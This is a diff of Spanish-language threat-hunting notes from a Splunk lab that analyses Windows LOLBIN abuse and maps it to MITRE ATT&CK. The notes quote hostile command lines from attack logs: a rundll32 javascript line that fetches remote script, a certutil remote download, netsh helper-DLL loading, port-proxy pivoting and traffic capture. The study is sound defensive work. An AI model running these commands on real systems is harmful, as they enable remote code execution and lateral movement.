@@ -19,6 +19,7 @@ index=attack_lab source=C:\\Logs\\SAMPLES-SPLUNK\\EVTX-ATTACK-SAMPLES-master\\Au
 ```
 
 ![Pasted image 20260501063034](../Fotos/Pasted%20image%2020260501063034.png)
+
 🔥 ALTAMENTE sospechoso en producción
 Porque combina:
 - LOLBIN (`certutil`)
@@ -32,6 +33,7 @@ Porque combina:
 - **T1059.003 – Command and Scripting Interpreter: Windows Command Shell**
 
 ![Pasted image 20260501064045](../Fotos/Pasted%20image%2020260501064045.png)
+
 🧠 ¿Qué es `bitsadmin.exe`?
 - Herramienta legítima de Windows
 - Nombre: **Background Intelligent Transfer Service**
@@ -80,7 +82,9 @@ Pero diferencian en subtecnicas:
 |---|---|
 |bitsadmin.exe|T1105 + T1059.003 (CMD)|
 |Start-BitsTransfer|T1105 + T1059.001 (PowerShell)|
+
 ![Pasted image 20260501065240](../Fotos/Pasted%20image%2020260501065240.png)
+
 🧠 2. `InstallUtil.exe`
  📌 ¿Qué es?
 - Herramienta legítima de Microsoft .NET Framework
@@ -124,6 +128,7 @@ Es una técnica conocida llamada:
 “Ejecuta la DLL `AllTheThings.dll` en modo **desinstalación**”
 
 ![Pasted image 20260501070131](../Fotos/Pasted%20image%2020260501070131.png)
+
 📌 ¿Qué es MSHTA?
 Microsoft HTML Application Host
 
@@ -167,7 +172,9 @@ Cierra la ventana de mshta
 ![Pasted image 20260501072612](../Fotos/Pasted%20image%2020260501072612.png)
 
 ![Pasted image 20260501074152](../Fotos/Pasted%20image%2020260501074152.png)
+
 ![Pasted image 20260501074217](../Fotos/Pasted%20image%2020260501074217.png)
+
 Flujo completo:
 1. Descarga script desde GitHub
 2. Lo guarda en disco
@@ -183,6 +190,7 @@ Windows PowerShell
 👉 Este es el más cercano a **fileless execution real**
 
 ![Pasted image 20260501080903](../Fotos/Pasted%20image%2020260501080903.png)
+
 🧩 2) `regsvcs.exe`
 regsvcs.exe
 📌 ¿Qué es?
@@ -197,6 +205,7 @@ Es el assembly .NET que se está cargando.
 📦 Un “paquete” que contiene código compilado + recursos + metadatos listos para ejecutarse dentro del entorno .NET.
 
 ![Pasted image 20260501081541](../Fotos/Pasted%20image%2020260501081541.png)
+
 🧩 2) `regasm.exe`
 regasm.exe
 📌 ¿Qué es?
@@ -225,8 +234,11 @@ ambos pueden ser usados como “launchers” de ejecución de DLL maliciosa
 |Uso típico|servicios del sistema|objetos COM reutilizables|
 |impacto|más “sistema”|más “interacción entre apps”|
 |abuso atacante|ejecución en contexto COM+|ejecución vía objetos COM|
+
 ![Pasted image 20260501082840](../Fotos/Pasted%20image%2020260501082840.png)
+
 ![Pasted image 20260501083157](../Fotos/Pasted%20image%2020260501083157.png)
+
 🧩 2) `regsvr32.exe`
 regsvr32.exe
 📌 ¿Qué es?
@@ -258,6 +270,7 @@ Flujo completo:
 5. sin escribir archivos locales visibles
 
 ![Pasted image 20260501083508](../Fotos/Pasted%20image%2020260501083508.png)
+
 🧩 2) `MSBuild.exe`
 📌 ¿Qué es?
 Es la herramienta oficial de Microsoft para:
@@ -273,6 +286,7 @@ MSBuild es especial porque:
 no es un “ejecutor de scripts”, sino un **compilador que puede ejecutar código durante la compilación**
 
 ![Pasted image 20260501084254](../Fotos/Pasted%20image%2020260501084254.png)
+
 🧩 2) `wmic`
 wmic.exe
 📌 ¿Qué es?
@@ -294,6 +308,7 @@ WMIC permite aplicar un **formato XSL (stylesheet)** para mostrar resultados. (X
 🔥 “WMI + XSL fileless execution”
 
 ![Pasted image 20260501091930](../Fotos/Pasted%20image%2020260501091930.png)
+
 ⚙️ 1) `netsh`
 📌 ¿Qué es?
 Herramienta de Windows para:
@@ -326,6 +341,7 @@ Pero en ciberseguridad puede ser:
 - se usa para espionaje de tráfico interno
 
 ![Pasted image 20260501092053](../Fotos/Pasted%20image%2020260501092053.png)
+
 Y todo está siendo lanzado desde:
 ```
 C:\ProgramData\ssh\runtests.bat
@@ -334,6 +350,7 @@ C:\ProgramData\ssh\runtests.bat
 - **típico de automatización maliciosa o testing EDR**
 
 ![Pasted image 20260501092431](../Fotos/Pasted%20image%2020260501092431.png)
+
 🟡 FASE 1: inspección de trazas
 ```
 netsh trace show status
@@ -341,6 +358,7 @@ netsh trace show status
 👉 Revisa si hay captura activa
 
 ![Pasted image 20260501092734](../Fotos/Pasted%20image%2020260501092734.png)
+
 🔴 FASE 2: ejecución de DLL helper (CRÍTICO)
 ```
 netsh.exe add helper AllTheThings.dll
@@ -352,6 +370,7 @@ netsh.exe add helper AllTheThings.dll
 ✔ técnica rara en entornos normales
 
 ![Pasted image 20260501092901](../Fotos/Pasted%20image%2020260501092901.png)
+
  🔴 FASE 3: port forwarding (túnel / pivoting)
 ```
 netsh interface portproxy add v4tov4 listenport=8080 connectport=8000 connectaddress=192.168.1.1
@@ -363,6 +382,7 @@ netsh interface portproxy add v4tov4 listenport=8080 connectport=8000 connectadd
 🔥 **port forwarding / pivoting interno**
 
 ![Pasted image 20260501093832](../Fotos/Pasted%20image%2020260501093832.png)
+
 🔁 FASE 4: manipulación del proxy
 ```
 netsh interface portproxy delete v4tov4 listenport=8080
@@ -370,6 +390,7 @@ netsh interface portproxy delete v4tov4 listenport=8080
 👉 limpia o cambia la configuración (evasión / rotación)
 
 ![Pasted image 20260501093918](../Fotos/Pasted%20image%2020260501093918.png)
+
 🔵 FASE 5: captura de tráfico
 ```
 netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etlnetsh trace stop
@@ -382,6 +403,7 @@ ETL (Event Trace Log)
 👉 esto es **recolección de tráfico**
 
 ![Pasted image 20260501094129](../Fotos/Pasted%20image%2020260501094129.png)
+
 🧩 ¿Qué es `dispdiag.exe`?
  📌 Función
 Es una herramienta de Windows para:
@@ -390,6 +412,7 @@ recopilar información de diagnóstico sobre la pantalla (GPU, drivers, renderin
 🔥 **script automatizado que prueba/recopila capacidades del sistema**
 
 ![Pasted image 20260501100014](../Fotos/Pasted%20image%2020260501100014.png)
+
 🧩 `rundll32.exe`
 📌 ¿Qué hace?
 Permite:
@@ -399,12 +422,14 @@ ejecutar una función específica dentro de una DLL
 “Carga la DLL y ejecuta la función llamada `EntryPoint`”
 
 ![Pasted image 20260501132059](../Fotos/Pasted%20image%2020260501132059.png)
+
 🧩 1. Sincronización
 - esperar que termine otro proceso
 - evitar ejecuciones simultáneas
 ⏱️ una pausa dentro de un script automatizado que está ejecutando múltiples acciones (DLL, red, tracing, etc.)
 
 ![Pasted image 20260501132522](../Fotos/Pasted%20image%2020260501132522.png)Ves esto:
+
 - `C:\Windows\System32\rundll32.exe`
 - `C:\Windows\SysWOW64\rundll32.exe`
 📌 ¿Qué significa?
@@ -415,6 +440,7 @@ ejecutar una función específica dentro de una DLL
 🔥 el script está probando compatibilidad en ambas arquitecturas
 
 ![Pasted image 20260501132656](../Fotos/Pasted%20image%2020260501132656.png)
+
 ```
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/.../test")
 ```
@@ -441,6 +467,7 @@ Aquí `rundll32` está siendo usado como:
 ![Pasted image 20260501133029](../Fotos/Pasted%20image%2020260501133029.png)
 
 ![Pasted image 20260501133903](../Fotos/Pasted%20image%2020260501133903.png)
+
 ```
 cmd /c taskkill /f /im rundll32.exe
 ```
@@ -449,6 +476,7 @@ cmd /c taskkill /f /im rundll32.exe
 - limpia ejecución
 
 ![Pasted image 20260501134159](../Fotos/Pasted%20image%2020260501134159.png)
+
 `certutil.exe -urlcache -split -f https://.../CradleTest.txt Default_File_Path2.ps1`
 🧩 certutil.exe
 📌 Uso normal:
@@ -469,6 +497,7 @@ Ejecución de código vía rundll32 + intento fileless + fallback a descarga rea
 ![Pasted image 20260501135448](../Fotos/Pasted%20image%2020260501135448.png)
 
 ![Pasted image 20260501140951](../Fotos/Pasted%20image%2020260501140951.png)
+
 🧩 `cmstp.exe`
 📌 ¿Qué es?
 Herramienta de Windows para:
@@ -494,7 +523,9 @@ Un `.inf` puede:
 🔥 usa cmstp para ejecutar código remoto disfrazado como configuración de red
 
 --------
+
 ![Pasted image 20260502103651](../Fotos/Pasted%20image%2020260502103651.png)
+
 🧩 `forfiles.exe`
  📌 ¿Qué es?
 Herramienta que permite:
@@ -512,6 +543,7 @@ ejecutar un comando para cada archivo que cumpla una condición
 👉 `forfiles` está siendo usado como: 🔥 **proxy de ejecución (LOLBIN)**
 
 ![Pasted image 20260502104655](../Fotos/Pasted%20image%2020260502104655.png)
+
 🧩 `winrm.exe`
 📌 ¿Qué es?
 Herramienta para:
@@ -560,6 +592,7 @@ cscript.exe
 
 
 ![Pasted image 20260502112753](../Fotos/Pasted%20image%2020260502112753.png)
+
 🧩 `schtasks.exe`
 📌 Qué es
 Herramienta para:
@@ -587,6 +620,7 @@ crear tareas programadas en Windows
 T1053.005 → Scheduled Task
 
 ![Pasted image 20260502113514](../Fotos/Pasted%20image%2020260502113514.png)
+
 🧩 1) `cscript.exe`
 👉 ejecuta scripts `.vbs`
 🧩 2) `pubprn.vbs`
